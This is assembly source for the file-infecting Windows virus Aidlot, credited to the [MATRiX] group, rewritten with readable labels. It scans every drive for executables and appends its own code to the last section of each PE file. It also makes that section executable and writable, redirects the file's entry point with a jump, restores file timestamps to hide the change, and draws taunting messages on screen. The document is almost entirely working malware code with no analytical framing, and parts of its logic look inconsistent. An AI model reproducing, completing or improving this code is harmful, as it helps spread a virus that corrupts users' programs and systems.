; Virus.Win32.Aidlot rewritten for TASM 5 with readable labels
; Target: 32-bit Windows PE executable
; Assumes linking with import32.lib for Win32 API calls

.386p
.MODEL FLAT, STDCALL
OPTION CASEMAP:NONE

; Include necessary Windows API definitions
INCLUDELIB import32.lib

; External Win32 API function declarations
EXTRN ExitProcess:PROC
EXTRN GlobalFindAtomA:PROC
EXTRN GetLastError:PROC
EXTRN GlobalAddAtomA:PROC
EXTRN CreateEventA:PROC
EXTRN CreateMutexA:PROC
EXTRN CreateMailslotA:PROC
EXTRN CreateThread:PROC
EXTRN Sleep:PROC
EXTRN CreateFileMappingA:PROC
EXTRN MapViewOfFile:PROC
EXTRN ReadFile:PROC
EXTRN SetEvent:PROC
EXTRN lstrcatA:PROC
EXTRN SetFileAttributesA:PROC
EXTRN CreateFileA:PROC
EXTRN UnmapViewOfFile:PROC
EXTRN CloseHandle:PROC
EXTRN SetFilePointer:PROC
EXTRN SetEndOfFile:PROC
EXTRN SetFileTime:PROC
EXTRN WaitForSingleObject:PROC
EXTRN FindFirstFileA:PROC
EXTRN FindNextFileA:PROC
EXTRN FindClose:PROC
EXTRN GetCurrentDirectoryA:PROC
EXTRN SetCurrentDirectoryA:PROC
EXTRN lstrcmpiA:PROC
EXTRN lstrlenA:PROC
EXTRN lstrcpyA:PROC
EXTRN WriteFile:PROC
EXTRN ReleaseMutex:PROC
EXTRN CreateDCA:PROC
EXTRN SetBkMode:PROC
EXTRN GetStockObject:PROC
EXTRN SelectObject:PROC
EXTRN TextOutA:PROC
EXTRN MessageBoxA:PROC
EXTRN GetSystemMetrics:PROC

; Segment definitions
CODE SEGMENT PARA PUBLIC 'CODE' USE32
ASSUME CS:CODE, DS:DATA, ES:NOTHING, SS:NOTHING, FS:NOTHING, GS:NOTHING

; Program entry point
PUBLIC MainEntry
MainEntry PROC NEAR
    ; Local variable for thread counter
    ThreadCounter EQU DWORD PTR [ESP-4]

    ; Check if already running using atom
    PUSH OFFSET RunningMarkerStr ; "Instance is running" indicator
    CALL GlobalFindAtomA
    CALL GetLastError
    OR EAX, EAX
    JZ ExitProgram              ; Exit if already running

    ; Mark instance as running
    PUSH OFFSET RunningMarkerStr
    CALL GlobalAddAtomA

    ; Create synchronization event
    PUSH OFFSET EventName       ; "e"
    PUSH 0                      ; bInitialState
    PUSH 0                      ; bManualReset
    PUSH 0                      ; lpEventAttributes
    CALL CreateEventA
    MOV DWORD PTR DS:[SyncEventHandle], EAX

    ; Create synchronization mutex
    PUSH OFFSET MutexName       ; "aid synch mutex"
    PUSH 0                      ; bInitialOwner
    PUSH 0                      ; lpMutexAttributes
    CALL CreateMutexA
    MOV DWORD PTR DS:[MutexHandle], EAX

    ; Store initial argument
    MOV EAX, DWORD PTR [ESP+0]
    MOV DWORD PTR DS:[RandomSeed], EAX

    ; Create mailslot for communication
    PUSH 0                      ; lpSecurityAttributes
    PUSH 0FFFFFFFFh             ; lReadTimeout (infinite)
    PUSH 258h                   ; nMaxMessageSize (600 bytes)
    PUSH OFFSET MailslotPath    ; "\\\\.\\mailslot\\aiD"
    CALL CreateMailslotA
    MOV DWORD PTR DS:[MailslotHandle], EAX

    ; Launch worker threads
    PUSH 3                      ; Number of threads
    MOV ESI, OFFSET ThreadFunctions ; Table of thread entry points

LaunchThreads:
    PUSH OFFSET BytesTransferred ; lpThreadId
    PUSH 0                      ; dwCreationFlags
    PUSH 0                      ; lpParameter
    LODSD                       ; Load thread function address
    PUSH EAX                    ; lpStartAddress
    PUSH 0                      ; dwStackSize
    PUSH 0                      ; lpThreadAttributes
    CALL CreateThread
    DEC DWORD PTR [ESP+4+ThreadCounter]
    JNZ LaunchThreads

    ; Enter infinite sleep
    PUSH 0FFFFFFFFh             ; dwMilliseconds (infinite)
    CALL Sleep

MapFileSection:
    PUSH EAX                    ; dwNumberOfBytesToMap
    PUSH EBX                    ; lpName
    PUSH EAX                    ; dwMaximumSizeLow
    PUSH 0                      ; dwMaximumSizeHigh
    PUSH 4                      ; flProtect (PAGE_READWRITE)
    PUSH 0                      ; lpFileMappingAttributes
    PUSH ECX                    ; hFile
    CALL CreateFileMappingA
    PUSH 0                      ; dwFileOffsetLow
    PUSH 0                      ; dwFileOffsetHigh
    PUSH 2                      ; dwDesiredAccess (FILE_MAP_WRITE)
    PUSH EAX                    ; hFileMappingObject
    XCHG EAX, EDI
    CALL MapViewOfFile
    RETN
MainEntry ENDP

; Exit routine
ExitProgram:
    PUSH 0                      ; uExitCode
    CALL ExitProcess

; Thread 1: Monitor and infect files
MonitorFiles PROC NEAR
    MOV EBX, OFFSET FileMappingName ; "aiD-fm"
    MOV EAX, 4000h              ; Size to map
    XOR ECX, ECX
    DEC ECX                     ; ECX = -1 (invalid file handle)
    CALL MapFileSection
    MOV DWORD PTR DS:[MappedMemoryPtr], EAX

ReadMailslotLoop:
    PUSH 0                      ; lpOverlapped
    PUSH OFFSET BytesTransferred ; lpNumberOfBytesRead
    PUSH 258h                   ; nNumberOfBytesToRead (600 bytes)
    PUSH OFFSET MessageBuffer   ; lpBuffer
    PUSH DWORD PTR DS:[MailslotHandle] ; hFile
    CALL ReadFile
    DEC DWORD PTR [ESP+0]       ; Decrement counter (assumes stack arg)
    PUSH OFFSET ReadMailslotLoop
    JNZ SignalEvent
    PUSH DWORD PTR DS:[SyncEventHandle] ; hEvent
    CALL SetEvent

SignalEvent:
    MOV EAX, OFFSET TargetFilePath
    CMP DWORD PTR [EAX], 534F4847h ; Check for "GHOST" signature
    JNZ MonitorFilesReturn
    PUSH EAX                    ; lpString2
    PUSH OFFSET TempFilePath    ; lpString1
    CALL lstrcatA
    PUSH EAX
    PUSH 20h                    ; dwFileAttributes (hidden)
    PUSH EAX                    ; lpFileName
    CALL SetFileAttributesA
    POP EAX
    PUSH 0                      ; hTemplateFile
    PUSH 0                      ; dwFlagsAndAttributes
    PUSH 3                      ; dwCreationDisposition (OPEN_EXISTING)
    PUSH 0                      ; lpSecurityAttributes
    PUSH 1                      ; dwShareMode (FILE_SHARE_READ)
    PUSH 0C0000000h             ; dwDesiredAccess (GENERIC_READ | GENERIC_WRITE)
    PUSH EAX                    ; lpFileName
    CALL CreateFileA
    PUSH EAX                    ; hObject
    PUSH EAX
    PUSH EAX                    ; hFile
    PUSH EAX
    XCHG EAX, ECX
    MOV EAX, DWORD PTR DS:[FileOffsetTracker]
    MOV DWORD PTR DS:[FilePosition], EAX
    ADD EAX, 4000h
    MOV EBX, OFFSET TargetFilePath
    CALL MapFileSection
    PUSH EDI                    ; hObject
    PUSH EAX                    ; lpBaseAddress
    CALL InfectFile
    CALL UnmapViewOfFile
    CALL CloseHandle
    POP EBX
    PUSH 0                      ; dwMoveMethod (FILE_BEGIN)
    PUSH 0                      ; lpDistanceToMoveHigh
    PUSH DWORD PTR DS:[FilePosition] ; lDistanceToMove
    PUSH EBX                    ; hFile
    CALL SetFilePointer
    CALL SetEndOfFile
    POP EBX
    MOV EAX, OFFSET FileLastWriteTime
    PUSH EAX                    ; lpLastWriteTime
    SUB EAX, 8
    PUSH EAX                    ; lpLastAccessTime
    SUB EAX, 8
    PUSH EAX                    ; lpCreationTime
    PUSH EBX                    ; hFile
    CALL SetFileTime
    CALL CloseHandle

MonitorFilesReturn:
    RETN
MonitorFiles ENDP

; Thread 2: Traverse directories
TraverseDirectories PROC NEAR
    PUSH DWORD PTR DS:[SyncEventHandle] ; hHandle
    CALL WaitForSingleObject
    MOV DWORD PTR DS:[CurrentPath], 5C3A43h ; "C:\"
    CALL ProcessDirectory
    PUSH 0                      ; uExitCode
    CALL ExitProcess
TraverseDirectories ENDP

; Directory processing subroutine
ProcessDirectory PROC NEAR
    ; Local variables
    DirDepth EQU DWORD PTR [ESP-8]
    FileFound EQU DWORD PTR [ESP-4]

    PUSH 0

GetCurrentDir:
    PUSH OFFSET DirBuffer       ; lpBuffer
    PUSH 104h                   ; nBufferLength (260 bytes)
    CALL GetCurrentDirectoryA
    MOV EDI, OFFSET CurrentPath
    PUSH EDI                    ; lpPathName

SetDirLoop:
    CALL SetCurrentDirectoryA
    OR EAX, EAX
    JZ DirTraversalDone
    PUSH OFFSET FileSearchData  ; lpFindFileData
    PUSH OFFSET WildcardSearch  ; "*.*"
    CALL FindFirstFileA
    PUSH EAX                    ; Save search handle

NextFile:
    POP EBX                     ; Restore search handle
    MOV EAX, DWORD PTR [ESP+4+FileFound]
    OR EAX, EAX
    JZ CheckFileType
    PUSH EBX
    PUSH OFFSET TempPath        ; lpString2
    PUSH OFFSET FileSearchData.cFileName ; lpString1
    CALL lstrcmpiA
    OR EAX, EAX
    POP EBX
    JNZ FindNextFile
    DEC DWORD PTR [ESP+4+FileFound]

FindNextFile:
    PUSH EBX                    ; hFindFile
    PUSH OFFSET FileSearchData  ; lpFindFileData
    PUSH EBX                    ; hFindFile
    CALL FindNextFileA
    DEC EAX
    JZ NextFile
    CALL FindClose
    DEC EAX
    CMP BYTE PTR DS:[CurrentPath+3], 0
    JZ IncrementDrive

MoveUpDir:
    PUSH OFFSET ParentDir       ; ".."
    CALL SetCurrentDirectoryA
    INC DWORD PTR [ESP+4+FileFound]
    MOV EDI, OFFSET CurrentPath
    PUSH EDI
    PUSH EDI                    ; lpString
    CALL lstrlenA
    ADD EDI, EAX
    XCHG EAX, ECX
    DEC EDI
    STD
    XOR AL, AL
    STOSB
    MOV AL, 5Ch                 ; '\'
    REPNE SCASB
    INC EDI
    PUSH EDI
    INC EDI
    CLD
    PUSH EDI                    ; lpString2
    PUSH OFFSET TempPath        ; lpString1
    CALL lstrcpyA
    POP EDI
    MOV WORD PTR [EDI], 5Ch     ; '\'
    JMP SetDirLoop

CheckFileType:
    CMP DWORD PTR DS:[FileSearchData.cFileName], 2Eh ; Skip '.'
    JZ FindNextFile
    MOV AL, BYTE PTR DS:[FileSearchData.dwFileAttributes]
    AND AL, 10h                 ; Check if directory
    CMP AL, 10h
    JNZ ProcessFile
    PUSH EBX                    ; hFindFile
    CALL FindClose
    MOV EDI, OFFSET CurrentPath
    PUSH EDI
    PUSH OFFSET FileSearchData.cFileName ; lpString2
    PUSH EDI                    ; lpString1
    CALL lstrcatA
    PUSH EDI                    ; lpString
    CALL lstrlenA
    ADD EAX, DWORD PTR [ESP+8+DirDepth]
    MOV WORD PTR [EAX], 5Ch     ; '\'
    JMP SetDirLoop

ProcessFile:
    PUSH EBX                    ; hFindFile
    CALL FindClose
    PUSH OFFSET FileSearchData.cFileName ; lpString2
    PUSH OFFSET TempPath        ; lpString1
    CALL lstrcpyA
    PUSH OFFSET DirBuffer       ; lpPathName
    CALL SetCurrentDirectoryA
    MOV DWORD PTR [ESP+4+FileFound], EAX
    PUSH 0FFFFFFFFh             ; dwMilliseconds (infinite)
    PUSH DWORD PTR DS:[MutexHandle] ; hHandle
    CALL WaitForSingleObject
    PUSH 0                      ; hTemplateFile
    PUSH 80h                    ; dwFlagsAndAttributes (FILE_ATTRIBUTE_NORMAL)
    PUSH 3                      ; dwCreationDisposition (OPEN_EXISTING)
    PUSH 0                      ; lpSecurityAttributes
    PUSH 1                      ; dwShareMode (FILE_SHARE_READ)
    PUSH 120116h                ; dwDesiredAccess
    PUSH OFFSET MailslotPath    ; "\\\\.\\mailslot\\aiD"
    CALL CreateFileA
    PUSH EAX                    ; hObject
    PUSH 0                      ; lpOverlapped
    PUSH OFFSET BytesTransferred ; lpNumberOfBytesWritten
    PUSH 258h                   ; nNumberOfBytesToWrite (600 bytes)
    PUSH OFFSET FileSearchData  ; lpBuffer
    PUSH EAX                    ; hFile
    CALL WriteFile
    CALL CloseHandle
    PUSH DWORD PTR DS:[MutexHandle] ; hMutex
    CALL ReleaseMutex
    JMP GetCurrentDir

IncrementDrive:
    INC BYTE PTR DS:[CurrentPath]
    JMP GetCurrentDir

DirTraversalDone:
    CMP BYTE PTR DS:[CurrentPath+3], 0
    JNZ MoveUpDir
    POP EAX
    RETN
ProcessDirectory ENDP

; Thread 3: Display message on screen
DisplayMessage PROC NEAR
    ; Local variables
    ScreenX EQU DWORD PTR [ESP-10h]
    ScreenY EQU DWORD PTR [ESP-0Ch]

    PUSH 0AFC80h                ; dwMilliseconds (delay ~11 seconds)
    CALL Sleep
    PUSH 0                      ; pdm
    PUSH 0                      ; pszPort
    PUSH 0                      ; pwszDevice
    PUSH OFFSET DisplayDriver  ; "DISPLAY"
    CALL CreateDCA
    MOV DWORD PTR DS:[DisplayContext], EAX
    PUSH 1                      ; mode (TRANSPARENT)
    PUSH EAX                    ; hdc
    CALL SetBkMode
    PUSH 10h                    ; i (DEFAULT_GUI_FONT)
    CALL GetStockObject
    PUSH EAX                    ; h
    PUSH DWORD PTR DS:[DisplayContext] ; hdc
    CALL SelectObject
    MOV DWORD PTR DS:[ScreenX], 10h
    MOV DWORD PTR DS:[ScreenY], 30h ; Starting position
    MOV ESI, OFFSET MessageTable ; List of messages

DrawMessages:
    LODSD
    OR EAX, EAX
    JZ ShowDialog
    XCHG EAX, EDI
    PUSH EDI                    ; lpString
    CALL lstrlenA
    PUSH EAX                    ; c
    PUSH EDI                    ; lpString
    PUSH DWORD PTR DS:[ScreenY] ; y
    PUSH DWORD PTR DS:[ScreenX] ; x
    PUSH DWORD PTR DS:[DisplayContext] ; hdc
    CALL TextOutA
    ADD DWORD PTR DS:[ScreenY], 14h ; Move down 20 pixels
    JMP DrawMessages

ShowDialog:
    PUSH 0                      ; uType (MB_OK)
    PUSH OFFSET DialogTitle     ; ".aid(s) by mort[MATRiX]"
    PUSH OFFSET DialogText      ; " click OK, and u'll b ok,..."
    PUSH 0                      ; hWnd
    CALL MessageBoxA
    PUSH 2                      ; mode (OPAQUE)
    PUSH DWORD PTR DS:[DisplayContext] ; hdc
    CALL SetBkMode
    PUSH 0                      ; nIndex (SM_CXSCREEN)
    CALL GetSystemMetrics
    MOV DWORD PTR DS:[ScreenX], EAX
    PUSH 1                      ; nIndex (SM_CYSCREEN)
    CALL GetSystemMetrics
    MOV DWORD PTR DS:[ScreenY], EAX

AnimateText:
    PUSH 8                      ; c
    PUSH OFFSET MatrixTag       ; "[MATRiX]"
    PUSH 0
    PUSH 0
    PUSH DWORD PTR DS:[DisplayContext] ; hdc
    PUSH DWORD PTR DS:[ScreenX]
    CALL GenerateRandomPos
    MOV DWORD PTR [ESP+14h+ScreenY], EAX ; y
    PUSH DWORD PTR DS:[ScreenX]
    CALL GenerateRandomPos
    MOV DWORD PTR [ESP+14h+ScreenX], EAX ; x
    CALL TextOutA
    JMP AnimateText
DisplayMessage ENDP

; Generate random position for text animation
GenerateRandomPos PROC NEAR
    ARG MaxValue:DWORD

    MOV EAX, DWORD PTR DS:[RandomSeed]
    ROL EAX, 3
    XOR EAX, DWORD PTR DS:[RandomSeed]
    ADC DWORD PTR DS:[RandomSeed], EAX
    MOV EBX, EAX
    SBB EAX, DWORD PTR DS:[RandomSeed]
    AND EAX, 0FFFFFFFh          ; Limit range

AdjustRange:
    CMP EAX, MaxValue
    JL RandomPosDone
    SUB EAX, MaxValue
    XOR DWORD PTR DS:[RandomSeed], EAX
    JMP AdjustRange

RandomPosDone:
    RETN 4
GenerateRandomPos ENDP

; Infect executable files
InfectFile PROC NEAR
    ; Local variables
    MapBase EQU DWORD PTR [ESP-10h]
    SectionTable EQU DWORD PTR [ESP-0Ch]
    FileBase EQU DWORD PTR [ESP-8]
    SectionSize EQU DWORD PTR [ESP-4]

    XCHG EAX, EBX               ; EBX = mapped file base
    MOVZX EAX, WORD PTR [EBX]
    NOT EAX
    CMP EAX, 0FFFFA5B2h         ; Check MZ signature (~'MZ')
    JNZ InfectFileReturn
    MOV ESI, [EBX+3Ch]          ; PE header offset
    ADD ESI, EBX
    LODSD
    NOT EAX
    CMP EAX, 0FFFFBAAFh         ; Check PE signature
    JNZ InfectFileReturn
    PUSH DWORD PTR [ESI+28h]    ; AddressOfEntryPoint
    PUSH DWORD PTR [ESI+30h]    ; BaseOfData
    ADD DWORD PTR [ESI+4Ch], 1600h ; Increase SizeOfCode
    MOV EAX, [ESI+70h]          ; NumberOfSections * sizeof(section)
    SHL EAX, 3
    ADD EAX, ESI
    ADD EAX, 74h                ; Point to section table
    PUSH EAX
    XCHG EAX, ESI
    XCHG EAX, EDI

FindLastSection:
    LODSD
    ADD ESI, 24h                ; Skip to next section
    OR EAX, EAX
    JNZ FindLastSection
    MOV EAX, [ESI-40h]          ; VirtualAddress
    ADD EAX, EBX
    ADD EAX, [ESI-3Ch]          ; PointerToRawData
    XCHG EAX, EDI
    PUSH EDI                    ; Save infection point
    MOV EAX, DWORD PTR DS:[MappedMemoryPtr]
    PUSH EAX
    MOV ECX, [EAX+4]            ; Size to copy
    ADD EAX, 10h
    XCHG EAX, ESI
    REP MOVSB                   ; Copy virus code
    XCHG EAX, ESI
    MOV EAX, [ESI-44h]          ; SizeOfRawData
    ADD EAX, [ESI-40h]          ; VirtualAddress
    POP EDI
    MOV ECX, EAX
    ADD EAX, [EDI]
    ADD EAX, DWORD PTR [ESP+10h+FileBase]
    XCHG EAX, EDX
    MOV EAX, DWORD PTR [ESP+10h+MapBase]
    ADD EAX, [EDI+8]
    MOV [EAX], EDX              ; Update relocation
    MOV EAX, DWORD PTR [ESP+10h+MapBase]
    ADD EAX, [EDI+0Ch]
    MOV [EAX], EDX              ; Update relocation
    ADD DWORD PTR [ESI-48h], 2000h ; Increase VirtualSize
    ADD DWORD PTR [ESI-40h], 1600h ; Increase VirtualAddress
    OR DWORD PTR [ESI-2Ch], 0A0000020h ; Set section flags (EXECUTE | READ | WRITE)
    MOV ESI, DWORD PTR [ESP+10h+SectionTable]
    MOV EAX, [ESI+14h]
    MOV EDX, DWORD PTR [ESP+10h+SectionSize]
    SUB EDX, [ESI+0Ch]
    ADD EAX, EDX
    ADD EAX, EBX
    XCHG EAX, ESI
    MOV EDI, DWORD PTR [ESP+10h+MapBase]
    ADD EDI, 0Bh
    PUSH ESI
    MOVSD
    MOVSB
    XCHG EAX, ESI
    MOV EAX, [ESI+0Ch]
    SUB ECX, EAX
    ADD EAX, DWORD PTR [ESP+14h+FileBase]
    ADD EAX, EDX
    SUB EDI, 0Fh
    STOSD
    POP EDI
    MOV AL, 0E9h                ; JMP opcode
    STOSB
    XCHG EAX, ECX
    SUB EAX, 5                  ; Adjust for JMP size
    STOSD
    ADD ESP, 10h
    ADD DWORD PTR DS:[FilePosition], 1600h ; Update file offset

InfectFileReturn:
    RETN
InfectFile ENDP

CODE ENDS

DATA SEGMENT PARA PUBLIC 'DATA' USE32
ASSUME CS:CODE, DS:DATA

; Data definitions
DialogTitle     DB '.aid(s) by mort[MATRiX]', 0
MailslotPath    DB '\\\\.\\mailslot\\aiD', 0
EventName       DB 'e', 0
MutexName       DB 'aid synch mutex', 0
ThreadFunctions DD OFFSET MonitorFiles, OFFSET TraverseDirectories, OFFSET DisplayMessage
FileMappingName DB 'aiD-fm', 0
RunningMarkerStr DB '.aiD properlly running', 0
WildcardSearch  DB '*.*', 0
ParentDir       DB '..', 0
DisplayDriver   DB 'DISPLAY', 0
MatrixTag       DB '[MATRiX]', 0
MessageTable    DD OFFSET MsgRunning, OFFSET MsgFreeware, OFFSET MsgCopyright
                DD OFFSET MsgTeam, OFFSET MsgGreetings, OFFSET MsgSpecialGreetz
                DD OFFSET MsgBugNote, OFFSET MsgDedication, 0
MsgRunning      DB '.aiD by mort[MATRiX] running properly on system...', 0
MsgFreeware     DB ' freeware version - for educational purpose only', 0
MsgCopyright    DB ' (c)[MATRiX] group 2000', 0
MsgTeam         DB ' [MATRiX] team: ULTRAS, Del_Armg0, NBK, Anaktos, Lord Dark, mort', 0
MsgGreetings    DB ' greetz: [MATRiX] team, all ppl on undernet #virus chan', 0
MsgSpecialGreetz DB ' special greetz to Anaktos, Darkman and Perikles', 0
MsgBugNote      DB ' special bug: well, i dont think it', 27h, 'll run ever properlly,...:)', 0
MsgDedication   DB ' ------[ dedicated moji marene ]-', 0
DialogText      DB ' click OK, and u', 27h, 'll b ok,...', 0

ALIGN 4
MailslotHandle  DD 0
ALIGN 16
MessageBuffer   DB 258h DUP(0)
FileLastWriteTime DD 0, 0           ; FILETIME structure
ALIGN 16
FileOffsetTracker DD 0
TargetFilePath  DB 276 DUP(0)
TempFilePath    DB 280 DUP(0)
BytesTransferred DD 0
SyncEventHandle DD 0
MutexHandle     DD 0
ALIGN 8
MappedMemoryPtr DD 0
FilePosition    DD 0
TempPath        DB 520 DUP(0)
DirBuffer       DB 520 DUP(0)

; WIN32_FIND_DATAA structure (simplified)
FileSearchData  DB 44 DUP(0)        ; dwFileAttributes, times, size, etc.
                DB 260 DUP(0)       ; cFileName (MAX_PATH)
                DB 14 DUP(0)        ; cAlternateFileName

CurrentPath     DD 0
                DB 256 DUP(0)       ; Extended buffer for path
RandomSeed      DD 0
ScreenX         DD 0
ScreenY         DD 0
DisplayContext  DD 0

DATA ENDS

END MainEntry
